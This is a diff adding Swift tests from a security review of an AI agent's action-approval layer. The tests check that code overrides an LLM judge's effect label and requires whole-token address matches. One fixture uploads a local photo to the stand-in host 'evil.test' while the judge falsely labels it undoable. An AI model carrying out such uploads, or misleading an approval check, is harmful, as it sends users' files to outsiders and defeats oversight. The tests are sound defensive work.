@@ -169,3 +169,35 @@ private let reply = #"{"verdicts":[{"id":"1","effect":"undoable","covered":true}
                              alwaysAllowed: false, repeatedTarget: true)
     expectEq(SheetLane.of([covered]), [.ask], "judge lanes: dos acciones al mismo destino siguen en hoja")
 }
+
+// Security review of #333 (round 2): the judge's effect label is not trusted for
+// a tool whose effect is known, and a name only counts as a whole token.
+
+@Test func anUploadLabelledUndoableIsStillGroundedOnTheHost() throws {
+    let words = try #require(UserWords(heard: "sube la foto"))
+    let upload = JudgeCandidate(id: "0", tool: "browser_set_files",
+                                argumentsJSON: #"{"bytes":10,"host":"evil.test","label":"ok","path":"/Users/k/a.png"}"#)
+    let lied = JudgeOpinion(effect: .undoable, covered: true)
+    let grounded = JudgeGrounding.grounded([lied], candidates: [upload], words: words)
+    expectEq(grounded, [JudgeOpinion(effect: .reachesSomeone, covered: false)],
+             "judge grounding: una subida siempre llega a alguien y el host debe estar en las palabras")
+}
+
+@Test func aPieceOfANamedAddressIsNotTheAddress() throws {
+    let words = try #require(UserWords(heard: "escribe a karen@gmail.com"))
+    let piece = JudgeCandidate(id: "0", tool: "app:gmail:send", argumentsJSON: #"{"to":"aren@gmail.com"}"#)
+    let whole = JudgeCandidate(id: "1", tool: "app:gmail:send", argumentsJSON: #"{"to":"karen@gmail.com"}"#)
+    let covered = JudgeOpinion(effect: .reachesSomeone, covered: true)
+    let grounded = JudgeGrounding.grounded([covered, covered], candidates: [piece, whole], words: words)
+    expectEq(grounded, [JudgeOpinion(effect: .reachesSomeone, covered: false), covered],
+             "judge grounding: un trozo de la direccion nombrada no la nombra")
+}
+
+@Test func aStepThatReadsLowersNoSheetBeforeItRuns() {
+    expect(JudgeStep.mayLower(tainted: false, toolNames: ["browser_set_files"]),
+           "judge step: un paso limpio puede bajar hojas")
+    expect(!JudgeStep.mayLower(tainted: true, toolNames: ["browser_set_files"]),
+           "judge step: un turno marcado no baja ninguna hoja")
+    expect(!JudgeStep.mayLower(tainted: false, toolNames: ["read_file", "browser_set_files"]),
+           "judge step: una lectura en el mismo paso cuenta como marca antes de correr")
+}
